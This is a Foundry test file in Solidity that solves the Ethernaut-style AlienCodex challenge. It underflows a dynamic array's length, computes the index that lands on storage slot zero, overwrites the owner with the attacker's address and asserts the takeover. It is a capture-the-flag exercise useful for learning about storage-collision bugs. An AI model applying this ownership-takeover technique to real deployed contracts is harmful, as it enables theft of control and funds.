// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

contract AlienCodexTest is Test {

    address public attacker = address(11);

    function setUp() public {
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 5 ether);

    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        bytes memory alienCodexBytesCode = abi.encodePacked(
            vm.getCode("./src-0_5_x/19_AlienCodex.json")
        );

        address alienCodexChallenge;

        assembly {
            alienCodexChallenge := create(
                0,
                add(alienCodexBytesCode, 0x20),
                mload(alienCodexBytesCode)
            )
        }

        (bool success1, ) = alienCodexChallenge.call(abi.encodeWithSignature("make_contact()"));
        require(success1);

        (bool success2, ) =alienCodexChallenge.call(abi.encodeWithSignature("retract()"));
        require(success2);

        uint codexIndexForSlotZero = ((2**256) - 1) - uint(keccak256(abi.encode(1))) +1;
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        (bool success3,) = alienCodexChallenge.call(abi.encodeWithSignature("revise(uint256,bytes32)",codexIndexForSlotZero,newOwner));
        require(success3);

        (bool success4, bytes memory data) = alienCodexChallenge.call(
            abi.encodeWithSignature("owner()")
        );
        require(success4);

        address refinedData = address(
            uint160(bytes20(uint160(uint256(bytes32(data)) << 0)))
        );

        //dont modify of the array length of a dynamic array as they can overwrite the whole contract's storage using overflows and underflows.

        assertEq( refinedData, attacker);
        
        vm.stopPrank( );
    }

}


